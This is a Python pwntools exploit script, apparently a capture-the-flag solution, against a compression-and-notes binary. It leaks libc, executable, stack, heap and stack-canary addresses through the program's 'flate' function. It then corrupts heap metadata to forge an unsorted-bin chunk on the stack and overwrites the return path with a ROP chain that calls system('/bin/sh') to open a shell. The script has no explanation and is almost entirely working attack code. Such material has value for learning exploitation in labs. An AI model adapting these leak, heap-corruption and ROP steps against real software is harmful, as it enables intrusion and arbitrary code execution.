from pwn import *
from icecream import ic

elf = exe = ELF("./compresse_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *deflate_string+207
b *deflate_string+297
b *flate_string
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def flate(string):
    sla(b'choice:',b'1')
    sla(b'flate:',string)

def deflate(string):
    sla(b'choice:',b'2')
    sla(b'deflate:',string)
    ru(b'Deflated: ')
    return rl().strip(b'\n')

def calloc(note):
    sla(b'choice:',b'3')
    sla(b'note:',note)

def edit(note):
    sla(b'choice:',b'4')
    sla(b'note:',note)

def free():
    sla(b'choice:',b'5')

def view():
    sla(b'choice:',b'6')
    ru(b'note : ')
    return rl()

def slc(idx):
    sla(b'choice:',b'7')
    sla(b'select:',str(idx).encode())

def ex():
    sla(b'choice:',b'8')

def numshit(val):
    fin = b""
    for i in val:
        fin += b"1" + bytes([i])
    return fin
    
flate(b'24b512b')
ru(b'Flated: ')
libc.address = u64(rl()[-7:-1].ljust(8,b'\0')) - 0xad7e2

flate(b'72b512b')
ru(b'Flated: ')
exe.address = u64(rl()[-7:-1].ljust(8,b'\0')) - 0x21d8

flate(b'80b512b')
ru(b'Flated: ')
stack = u64(rl()[-7:-1].ljust(8,b'\0'))

flate(b'249b512b')
ru(b'Flated: ')
canary = u64(rl()[-9:-2].rjust(8,b'\0'))

calloc(b'fake')
flate(b'512b1b')
ru(b'Flated: ')
heap = u64(rl()[-7:-1].ljust(8,b'\0')) - 0x6b0


ic(hex(libc.address))
ic(hex(exe.address))
ic(hex(stack))
ic(hex(heap))
ic(hex(canary))

# Exploit stage 2

calloc(b"JUNK2")
calloc(b'BORDER')

slc(0)
edit(p64(heap + 0x6a0) * 2 + p64(0) * 2)

slc(1)
flate(b"512A")

edit(b"\x00"  * 0xc0 + p64(0x420) + p64(0x420))

slc(1)
free()

slc(0)
edit(p64(libc.address + 0x203b20) + p64(stack - 0x3a0) + p64(0)*2 + p64(stack - 0x3a0))

# Fake unsorted bin chunk in stack

for i in range(6):
    flate(f"{422 + 32 + 8 - i + 1}" )
flate(b"456\1" + b"1" + p64(0x21))

for i in range(6):
    flate(f"{430 - i + 1}" )
flate(b"424\1" + b"1" + p64(0x20))

for i in range(6):
    flate(f"{430-8 - i + 1}" )
flate(b"416\1" + numshit(p64(0x420)))

flate(p64(0) + p64(0x421) + p64(heap + 0x6a0) + p64(heap + 0x6a0 + 32))

calloc(b"BOB")

# stack - overwrite ROP
flate(b"512A")

ret = 0x000000000000101a + elf.address
poprdi = 0x000000000010f75b + libc.address

log.info(hex(stack - 0x3a0 + 0x10))
if((stack-0x3a0 + 0x10)%0x100 == 0x30):
    print("WORKS ?")
    pause()
else:
    exit()

edit(p64(ret)*2 + p64(poprdi) + p64(next(libc.search(b"/bin/sh\0"))) + p64(libc.sym.system))


io.interactive()
